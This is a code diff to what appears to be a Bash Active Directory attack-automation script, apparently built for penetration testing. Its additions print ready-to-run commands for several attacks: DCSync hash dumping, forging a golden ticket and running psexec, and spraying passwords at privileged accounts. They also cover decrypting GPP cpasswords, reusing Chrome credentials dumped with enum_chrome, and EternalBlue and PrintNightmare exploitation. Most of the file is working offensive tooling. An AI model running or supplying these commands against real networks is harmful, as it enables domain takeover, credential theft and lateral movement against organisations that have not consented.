@@ -361,6 +361,16 @@ phase1_domain_context() {
     if grep -qF 'Pwn3d!' "$ctx_out"; then
         success "*** ADMIN ACCESS (Pwn3d!) — ${AD_USER} is local admin on DC ***"
         echo "ADMIN_ON_DC=YES" >> "${OUTDIR}/summary_notes.txt"
+        # DCSync — full domain dump
+        if [[ "$AUTH_TYPE" == "hash" ]]; then
+            attack_cmd "DCSYNC — ADMIN ON DC DETECTED (dump all hashes)" \
+                "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}@${DC_IP} -hashes ${LM_NT_HASH}" \
+                "nxc smb ${DC_IP} -u ${AD_USER} -H ${NT_HASH} --ntds   # faster, streams to stdout"
+        else
+            attack_cmd "DCSYNC — ADMIN ON DC DETECTED (dump all hashes)" \
+                "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:${PASS}@${DC_IP}" \
+                "nxc smb ${DC_IP} -u ${AD_USER} -p '${PASS}' --ntds   # faster, streams to stdout"
+        fi
     fi
 
     # 1d. Password/lockout policy
@@ -387,6 +397,15 @@ phase1_domain_context() {
         if [[ -n "$sid" ]]; then
             success "Domain SID: ${sid}"
             echo "DOMAIN_SID=${sid}" >> "${OUTDIR}/summary_notes.txt"
+            # Golden ticket template — needs krbtgt hash (from DCSync)
+            attack_cmd "GOLDEN TICKET (needs krbtgt NT hash from DCSync)" \
+                "# After DCSync — get krbtgt NT hash:" \
+                "grep krbtgt ${OUTDIR}/loot/*.txt 2>/dev/null | grep -oP '[a-fA-F0-9]{32}\$'" \
+                "" \
+                "# Forge golden ticket:" \
+                "impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid ${sid} -domain ${DOMAIN} Administrator" \
+                "export KRB5CCNAME=Administrator.ccache" \
+                "impacket-psexec -k -no-pass ${DOMAIN}/Administrator@${DC_IP}"
         fi
 
         cmd_log "rpcclient ${RPC_HASH_FLAG[*]} -U '${RPC_CRED}' ${DC_IP} -c enumdomains"
@@ -545,6 +564,35 @@ phase2_user_enum() {
             grep -v "^===" | grep -v "^$" | head -10 || true)
         if [[ -n "$da_section" ]]; then
             echo "DOMAIN_ADMINS=${da_section}" >> "${OUTDIR}/summary_notes.txt"
+        fi
+
+        # Extract member RIDs and resolve to usernames for spray targeting
+        local priv_members_file="${OUTDIR}/groups/privileged_members_resolved.txt"
+        if [[ -s "$priv_out" ]]; then
+            info "  → Resolving privileged group member RIDs to usernames"
+            grep -oP 'rid\[0x[0-9a-fA-F]+\]' "$priv_out" 2>/dev/null \
+                | grep -oP '0x[0-9a-fA-F]+' \
+                | sort -u \
+                | while IFS= read -r rid_hex; do
+                    local rid_dec
+                    rid_dec=$(printf '%d' "$rid_hex" 2>/dev/null || true)
+                    [[ -z "$rid_dec" ]] && continue
+                    timeout 10 rpcclient "${RPC_HASH_FLAG[@]}" \
+                        -U "$RPC_CRED" "$DC_IP" \
+                        -c "queryuser ${rid_dec}" 2>/dev/null \
+                        | grep -oP 'User Name\s*:\s*\K\S+' || true
+                done > "$priv_members_file" 2>/dev/null || true
+
+            local priv_count=0
+            priv_count=$(wc -l < "$priv_members_file" 2>/dev/null); priv_count=${priv_count:-0}
+            if (( priv_count > 0 )); then
+                success "  ★ Privileged members resolved → groups/privileged_members_resolved.txt ($priv_count users)"
+                head -10 "$priv_members_file" | sed 's/^/    /'
+                attack_cmd "SPRAY AGAINST PRIVILEGED GROUP MEMBERS" \
+                    "cat ${priv_members_file}" \
+                    "nxc smb ${DC_IP} -u ${priv_members_file} -p 'CRACKED_PASS' -d ${DOMAIN} --continue-on-success" \
+                    "./sprayr.sh -U ${priv_members_file} -p 'CRACKED_PASS' -t ${DC_IP}"
+            fi
         fi
     fi
 
@@ -828,6 +876,20 @@ phase6_bloodhound() {
         info "  2. Click 'File Ingest' → upload ${bh_zip}"
         info "  3. Mark compromised users as 'Owned'"
         info "  4. Run: 'Shortest Path to Domain Admins from Owned Principals'"
+        echo ""
+        attack_cmd "BLOODHOUND — IMPORT AND ANALYZE" \
+            "# Option A: BloodHound CE web UI (browser):" \
+            "# → File Ingest → upload ${bh_zip}" \
+            "# → Analysis → Shortest Path to DA from Owned" \
+            "" \
+            "# Option B: bloodhound-cli (command-line import):" \
+            "bloodhound-cli upload --path ${bh_zip} --url http://localhost:8080 --username admin --password <BHCE_PASS>" \
+            "" \
+            "# Key queries after import:" \
+            "# 1. Shortest Paths to Domain Admins" \
+            "# 2. Kerberoastable users with path to DA" \
+            "# 3. Users with DCSync rights" \
+            "# 4. ASREPRoastable users"
         progress_log "DONE" "$phase_key" "zip=${bh_zip}"
     else
         warn "BloodHound collection may have failed (exit ${bh_exit})"
@@ -896,12 +958,34 @@ phase7_shares() {
             "${OUTDIR}/shares/sysvol_ls.txt" 2>/dev/null; then
             success "*** Groups.xml FOUND IN SYSVOL — GPP password likely ***"
             echo "GROUPS_XML=YES" >> "${OUTDIR}/summary_notes.txt"
-            attack_cmd "GPP PASSWORD (Groups.xml found in SYSVOL)" \
-                "# Download Groups.xml from SYSVOL, then:" \
-                "gpp-decrypt '<cpassword_value_from_xml>'" \
-                "" \
-                "# Or use impacket-GetGPPPassword:" \
-                "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-GetGPPPassword -dc-ip ${DC_IP} -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}"; else echo "impacket-GetGPPPassword -dc-ip ${DC_IP} ${DOMAIN}/${AD_USER}:${PASS}"; fi)"
+            # Try to extract actual cpassword values from already-downloaded Groups.xml files
+            local gpp_cmds=()
+            local groups_xml_files
+            mapfile -t groups_xml_files < <(find "${OUTDIR}/shares" -name 'Groups.xml' 2>/dev/null)
+            if (( ${#groups_xml_files[@]} > 0 )); then
+                for gxml in "${groups_xml_files[@]}"; do
+                    local cpw
+                    cpw=$(grep -oP 'cpassword="\K[^"]+' "$gxml" 2>/dev/null | head -1 || true)
+                    if [[ -n "$cpw" ]]; then
+                        gpp_cmds+=("gpp-decrypt '${cpw}'   # from: $gxml")
+                    fi
+                done
+            fi
+            if (( ${#gpp_cmds[@]} > 0 )); then
+                attack_cmd "GPP PASSWORD (Groups.xml — cpassword extracted)" \
+                    "${gpp_cmds[@]}" \
+                    "" \
+                    "# After decrypting — spray the password:" \
+                    "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-GetGPPPassword -dc-ip ${DC_IP} -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}"; else echo "impacket-GetGPPPassword -dc-ip ${DC_IP} ${DOMAIN}/${AD_USER}:${PASS}"; fi)"
+            else
+                attack_cmd "GPP PASSWORD (Groups.xml found in SYSVOL)" \
+                    "# Download Groups.xml from SYSVOL, then:" \
+                    "grep -oP 'cpassword=\"\\K[^\"]+' Groups.xml   # extract cpassword" \
+                    "gpp-decrypt '<cpassword_value>'                # decrypt it" \
+                    "" \
+                    "# Or use impacket-GetGPPPassword:" \
+                    "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-GetGPPPassword -dc-ip ${DC_IP} -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}"; else echo "impacket-GetGPPPassword -dc-ip ${DC_IP} ${DOMAIN}/${AD_USER}:${PASS}"; fi)"
+            fi
         fi
 
         # Flag other interesting files
@@ -1180,6 +1264,24 @@ mode_chain() {
         timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" -M enum_chrome \
             > "${loot_dir}/browser_creds.txt" 2>&1 || true
 
+        # Parse browser_creds.txt for cleartext passwords
+        if [[ -s "${loot_dir}/browser_creds.txt" ]]; then
+            local browser_pw_count=0
+            browser_pw_count=$(grep -ciE 'password|passwd' "${loot_dir}/browser_creds.txt" 2>/dev/null || echo 0)
+            if (( browser_pw_count > 0 )); then
+                success "  ★ Browser credentials found:"
+                grep -iE 'password|passwd|URL|username' "${loot_dir}/browser_creds.txt" 2>/dev/null \
+                    | grep -v '^#\|^$' | head -20 | sed 's/^/    /'
+                echo ""
+                info "  → Add found passwords to spray list:"
+                info "    grep -iE 'password' ${loot_dir}/browser_creds.txt | awk '{print \$NF}' > ${loot_dir}/browser_passwords.txt"
+                info "    ./sprayr.sh -u ${AD_USER} -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
+                attack_cmd "SPRAY BROWSER PASSWORDS (from enum_chrome dump)" \
+                    "grep -iE 'password' ${loot_dir}/browser_creds.txt | awk '{print \$NF}' > ${loot_dir}/browser_passwords.txt" \
+                    "./sprayr.sh -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
+            fi
+        fi
+
         success "Credential dumps saved to ${loot_dir}/"
         echo "[$(date '+%H:%M:%S')] Step 4 DONE — credential dump" >> "$chain_log"
     fi
@@ -1334,6 +1436,11 @@ write_summary() {
 
         echo "USERS"
         echo "  Total: ${user_count} unique accounts → users/all_users.txt"
+        echo "  Review: cat ${OUTDIR}/users/suspicious_descriptions.txt  (passwords in descriptions)"
+        echo "  If hash cracking fails, spray userlist:"
+        echo "    ./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP}"
+        echo "    ./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p '<company_name>123' -d ${DOMAIN} -t ${DC_IP}"
+        echo "    # Check lockout threshold first: cat ${OUTDIR}/password_policy.txt"
         echo ""
 
         echo "KERBEROS ATTACK CANDIDATES"
@@ -1368,6 +1475,11 @@ write_summary() {
         fi
         if grep -qF "PRIV_SESSIONS=YES" "$notes" 2>/dev/null; then
             echo "  *** PRIVILEGED USER SESSIONS VISIBLE — see sessions/ ***"
+            echo "  Logged-on privileged users: cat ${OUTDIR}/sessions/smb_sessions.txt"
+            echo "  If you have code exec on that host:"
+            echo "    # Token impersonation (Meterpreter): use incognito → list_tokens -u → impersonate_token"
+            echo "    # Windows: Invoke-TokenManipulation.ps1"
+            echo "    # Targeted Kerberoast the user if SPN-registered"
         fi
         echo ""
 
@@ -1375,6 +1487,26 @@ write_summary() {
         if grep -qF "OLD_OS=YES" "$notes" 2>/dev/null; then
             echo "  *** LEGACY OS FOUND — HIGH VALUE TARGETS ***"
             sed 's/^/  /' "${OUTDIR}/computers/old_os.txt" 2>/dev/null || true
+            echo ""
+            echo "  Exploitation guidance by OS:"
+            while IFS= read -r os_line; do
+                local os_host os_ver
+                os_host=$(echo "${os_line}" | awk '{print $1}')
+                os_ver=$(echo "${os_line}" | tr '[:upper:]' '[:lower:]')
+                case "${os_ver}" in
+                    *"windows 7"*|*"2008"*|*"xp"*|*"vista"*)
+                        echo "  ${os_host}: MS17-010 (EternalBlue) — nxc smb ${os_host} -M ms17-010"
+                        echo "    impacket-eternalblue ${os_host}  OR  msf: use exploit/windows/smb/ms17_010_eternalblue" ;;
+                    *"2012"*|*"windows 8"*)
+                        echo "  ${os_host}: Check MS17-010, PrintNightmare, EternalBlue"
+                        echo "    nxc smb ${os_host} -M ms17-010" ;;
+                    *"2019"*|*"windows 10"*)
+                        echo "  ${os_host}: PrintNightmare (CVE-2021-1675)"
+                        echo "    impacket-rpcdump ${os_host} | grep -i 'print'" ;;
+                    *)
+                        echo "  ${os_host}: check searchsploit / nxc modules for this OS version" ;;
+                esac
+            done < <(cat "${OUTDIR}/computers/old_os.txt" 2>/dev/null | head -10)
         else
             echo "  None identified"
         fi
